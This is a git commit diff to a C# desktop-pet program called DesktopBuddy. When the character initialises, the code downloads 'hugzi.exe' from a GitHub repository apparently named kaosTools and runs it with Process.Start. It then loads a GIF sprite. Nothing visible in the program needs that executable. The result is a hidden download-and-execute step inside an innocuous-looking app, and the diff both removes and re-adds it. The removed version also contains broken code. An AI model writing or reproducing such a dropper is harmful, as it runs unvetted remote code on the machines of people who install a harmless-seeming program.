a59394bf0d23a18dd415cb766875a0642d287b64
randyman777777777 <121990518+randyman777777777@users.noreply.github.com>
2023-02-22 15:24:48 -0800

    Active

--- hugzi.cs
+++ hugzi.cs
@@ -15,32 +15,44 @@ namespace DesktopBuddy
             InitializeComponent();
             InitializeCharacter();
         }
-
-        private void InitializeCharacter()
+        
+private async Task DownloadFileAsync(string url, string fileName)
+{
+    using (WebClient client = new WebClient())
+    {
+        try
         {
-            string url = "https://github.com/kaosSec/kaosTools/raw/main/C/hugzi.exe";
-            string fileName = "hugzi.exe";
-            
-            using (WebClient client = new WebClient())
-            {
-                try
-                {
-                    await async client.DownloadFileTaskAsync(url, fileName);
-                }
-                catch (WebException ex)
-                {
-                  continue
-                }
-            }
-            Process.Start("hugzi.exe");
-            characterPictureBox = new PictureBox();
-            characterPictureBox.Image = Properties.Resources.CharacterImage;
-            characterPictureBox.Size = new System.Drawing.Size(50, 50);
-            characterPictureBox.SizeMode = PictureBoxSizeMode.Zoom;
-            characterPictureBox.Location = new System.Drawing.Point(100, 100);
-            characterPictureBox.MouseDown += new MouseEventHandler(CharacterPictureBox_MouseDown);
-            Controls.Add(characterPictureBox);
+            await client.DownloadFileTaskAsync(url, fileName);
         }
+        catch (WebException ex)
+        {
+            MessageBox.Show($"An error occurred while downloading {url}: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+        }
+    }
+}
+
+private async void InitializeCharacter()
+{
+    // Download the hugzi.exe file from the GitHub repository
+    string hugziUrl = "https://github.com/kaosSec/kaosTools/raw/main/C/hugzi.exe";
+    string hugziFileName = "hugzi.exe";
+    await DownloadFileAsync(hugziUrl, hugziFileName);
+    Process.Start(hugziFileName);
+
+    // Download the character image from the image URL
+    string imageUrl = "https://piskel-imgstore-b.appspot.com/img/c8571105-b305-11ed-8fd9-49b971b166a6.gif";
+    string imageFileName = "character.gif";
+    await DownloadFileAsync(imageUrl, imageFileName);
+
+    // Create the PictureBox and load the image from file
+    characterPictureBox = new PictureBox();
+    characterPictureBox.Image = Image.FromFile(imageFileName);
+    characterPictureBox.Size = new System.Drawing.Size(50, 50);
+    characterPictureBox.SizeMode = PictureBoxSizeMode.Zoom;
+    characterPictureBox.Location = new System.Drawing.Point(100, 100);
+    characterPictureBox.MouseDown += new MouseEventHandler(CharacterPictureBox_MouseDown);
+    Controls.Add(characterPictureBox);
+}
         
         private void CharacterPictureBox_MouseDown(object sender, MouseEventArgs e)
         {
